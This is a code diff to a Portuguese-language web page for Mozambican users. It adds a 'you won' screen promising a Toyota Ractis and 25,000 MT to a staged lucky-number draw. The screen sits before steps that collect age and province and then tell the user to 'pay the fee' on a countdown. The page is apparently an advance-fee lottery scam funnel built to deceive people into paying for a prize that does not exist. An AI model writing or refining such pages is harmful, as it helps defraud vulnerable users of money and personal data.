@@ -79,11 +79,13 @@
         <div class="flex-1 h-[3px] mx-2 rounded bg-black/10"><div class="progress-line bg-gold h-full" id="p1"></div></div>
         <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c2">2</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">Sorteio</div></div>
         <div class="flex-1 h-[3px] mx-2 rounded bg-black/10"><div class="progress-line bg-gold h-full" id="p2"></div></div>
-        <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c3">3</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">Dados</div></div>
+        <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c3">3</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">Prêmio</div></div>
         <div class="flex-1 h-[3px] mx-2 rounded bg-black/10"><div class="progress-line bg-gold h-full" id="p3"></div></div>
-        <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c4">4</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">Concluir</div></div>
+        <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c4">4</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">Dados</div></div>
+        <div class="flex-1 h-[3px] mx-2 rounded bg-black/10"><div class="progress-line bg-gold h-full" id="p4"></div></div>
+        <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c5">5</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">Concluir</div></div>
       </div>
-      <div class="mt-4 text-center"><span class="font-bold" id="step-label">Etapa 1 de 4</span><span class="ml-2 text-xs opacity-60 uppercase tracking-wider" id="step-sub">Preencha seus dados para continuar</span></div>
+      <div class="mt-4 text-center"><span class="font-bold" id="step-label">Etapa 1 de 5</span><span class="ml-2 text-xs opacity-60 uppercase tracking-wider" id="step-sub">Preencha seus dados para continuar</span></div>
     </div>
   </section>
 
@@ -166,15 +168,66 @@
       </div>
     </section>
 
-    <!-- STEP 3: Dados -->
+    <!-- STEP 3: Prêmio -->
     <section id="s3" class="hidden fade-in">
+      <div class="bg-emerald-500 text-white p-6 md:p-8 rounded-2xl shadow-xl border border-emerald-200 text-center relative overflow-hidden">
+        <div class="absolute top-0 left-0 w-full h-full opacity-10 pointer-events-none" style="background-image: url('https://www.transparenttextures.com/patterns/cubes.png');"></div>
+        
+        <div class="relative z-10">
+          <div class="w-16 h-16 rounded-full bg-white text-emerald-600 flex items-center justify-center mx-auto mb-4 text-2xl font-bold">🎉</div>
+          
+          <div class="flex items-center justify-center gap-2 mb-2">
+            <div class="text-yellow-200 text-xl">🎊</div>
+            <h2 class="text-3xl md:text-4xl font-extrabold">PARABÉNS!</h2>
+            <div class="text-yellow-200 text-xl">🎊</div>
+          </div>
+          
+          <p class="text-emerald-100 text-lg mb-6">Você acertou o número da sorte!</p>
+
+          <!-- Imagem do prêmio -->
+          <div class="relative mb-6">
+            <img src="https://images.unsplash.com/photo-1583121274602-3e2820c69888?w=600&h=400&fit=crop" alt="Toyota Ractis" class="rounded-xl shadow-lg border-2 border-white/20 w-full max-w-md mx-auto object-cover h-48 md:h-64"/>
+            <div class="absolute -bottom-4 left-1/2 transform -translate-x-1/2 bg-white/20 backdrop-blur px-4 py-2 rounded-full text-xs font-bold uppercase tracking-wider text-white/90">
+              Prêmio principal
+            </div>
+          </div>
+
+          <div class="mb-4">
+            <h3 class="text-2xl md:text-3xl font-bold text-white mb-1">VOCÊ ACABA DE GANHAR</h3>
+            <h1 class="text-4xl md:text-5xl font-extrabold text-white mb-2">Toyota Ractis</h1>
+            <p class="text-emerald-200 text-lg">+ 25.000 MT de prêmio adicional</p>
+          </div>
+
+          <div class="flex justify-center gap-4 mb-6">
+            <div class="bg-white/20 rounded-xl p-3 border border-white/30">
+              <div class="text-xs text-emerald-200/80 uppercase tracking-wider font-bold">Número Sorteado</div>
+              <div class="text-2xl font-bold text-white mt-1" id="premio-numero-sorteado">1</div>
+            </div>
+            <div class="bg-white/20 rounded-xl p-3 border border-white/30">
+              <div class="text-xs text-emerald-200/80 uppercase tracking-wider font-bold">Seu Número</div>
+              <div class="text-2xl font-bold text-white mt-1" id="premio-seu-numero">1</div>
+            </div>
+          </div>
+
+          <button id="btn-confirmar-premio" class="w-full py-4 rounded-xl font-bold text-emerald-700 transition bg-white hover:bg-emerald-50 active:scale-95 shadow-lg flex items-center justify-center gap-2">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.337m0 0L16.658 19.34A3 3 0 0119 21c5.147 0 6.45-1.977 5.006-4.027a2 2 0 00-.316-1.175M7 10a2 2 0 012-2h1.172a2 2 0 011.414.586l.828.828a2 2 0 011.172 0l.828.828a2 2 0 010 2.828l-.829.828a2 2 0 01-1.172 0l-.828-.828a2 2 0 00-.586-1.414A2 2 0 007 10z"></path></svg>
+            CONFIRMAR MEUS PRÊMIOS
+          </button>
+
+          <p class="mt-6 text-emerald-100/80 text-sm uppercase tracking-wider">Próximo: Confirme seus dados para receber o prêmio</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- STEP 4: Dados -->
+    <section id="s4" class="hidden fade-in">
       <div class="bg-white/80 backdrop-blur rounded-2xl shadow-sm border border-black/5 p-6 md:p-7">
         <h2 class="text-2xl md:text-3xl font-extrabold text-center mb-6">Confirme seus dados</h2>
-        <form id="f3" class="space-y-4" onsubmit="return nextStep(3)">
+        <form id="f4" class="space-y-4" onsubmit="return nextStep(4)">
           <div><label class="flex items-center gap-2 font-bold mb-2"><span class="opacity-70"><svg class="lucide lucide-calendar h-4 w-4"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg></span> Idade</label><input type="number" id="idade" placeholder="Sua idade" min="18" required class="input w-full"/></div>
           <div><label class="flex items-center gap-2 font-bold mb-2"><span class="opacity-70"><svg class="lucide lucide-map-pin h-4 w-4"><path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"></path><circle cx="12" cy="10" r="3"></circle></svg></span> Província</label><select id="provincia" required class="input w-full"><option value="" selected disabled>Selecione uma província</option><option>Maputo</option><option>Matola</option><option>Gaza</option><option>Inhambane</option><option>Sofala</option><option>Manica</option><option>Tete</option><option>Zambézia</option><option>Nampula</option><option>Cabo Delgado</option><option>Niassa</option></select></div>
           <div class="flex justify-between">
-            <button type="button" onclick="prevStep(3)" class="h-14 rounded-lg font-bold text-navy-deep transition bg-white border border-black/10 hover:bg-black/5">Voltar</button>
+            <button type="button" onclick="prevStep(4)" class="h-14 rounded-lg font-bold text-navy-deep transition bg-white border border-black/10 hover:bg-black/5">Voltar</button>
             <button type="submit" class="h-14 rounded-lg font-bold text-white transition bg-gold text-navy-deep hover:bg-[#c5a22e] active:scale-95 shadow-md">Próximo &rarr;</button>
           </div>
         </form>
@@ -279,7 +332,7 @@
     const _showStep = showStep;
     showStep = function (n) {
       _showStep(n);
-      if (n === 4) {
+      if (n === 5) {
         taxaRestante = TAXA_SEGUNDOS;
         contadorTaxa.classList.remove('hidden');
         btnTaxa.classList.add('hidden');
@@ -316,6 +369,7 @@
     const popupMensagem = document.getElementById('popup-mensagem');
     const popupRestantes = document.getElementById('popup-restantes');
     const btnPopupTentar = document.getElementById('btn-popup-tentar');
+    const btnConfirmarPremio = document.getElementById('btn-confirmar-premio');
 
     function resetarSorteio() {
       tentativaAtual = 1;
@@ -378,6 +432,10 @@
           showStep(3);
         };
         popupErro.classList.add('hidden');
+
+        // Preencher tela de prêmio
+        document.getElementById('premio-numero-sorteado').textContent = numeroVencedor;
+        document.getElementById('premio-seu-numero').textContent = numeroEscolhido;
       } else {
         // ERROU - popup em cima do número
         tentativaAtual++;
@@ -432,7 +490,24 @@
       if (n === 2) {
         resetarSorteio();
       }
+      // Definir textos das etapas
+      const labels = {
+        1: ['Etapa 1 de 5', 'Preencha seus dados para continuar'],
+        2: ['Etapa 2 de 5', 'Escolha seu número da sorte'],
+        3: ['Etapa 3 de 5', 'Você ganhou! Confirme seu prêmio'],
+        4: ['Etapa 4 de 5', 'Confirme seus dados para receber o prêmio'],
+        5: ['Etapa 5 de 5', 'Assista ao sorteio e pague a taxa']
+      };
+      if (labels[n]) {
+        document.getElementById('step-label').textContent = labels[n][0];
+        document.getElementById('step-sub').textContent = labels[n][1];
+      }
     };
+
+    // Botão confirmar prêmio -> vai para etapa 4 (Dados)
+    btnConfirmarPremio.addEventListener('click', function () {
+      showStep(4);
+    });
   </script>
 
 </body>
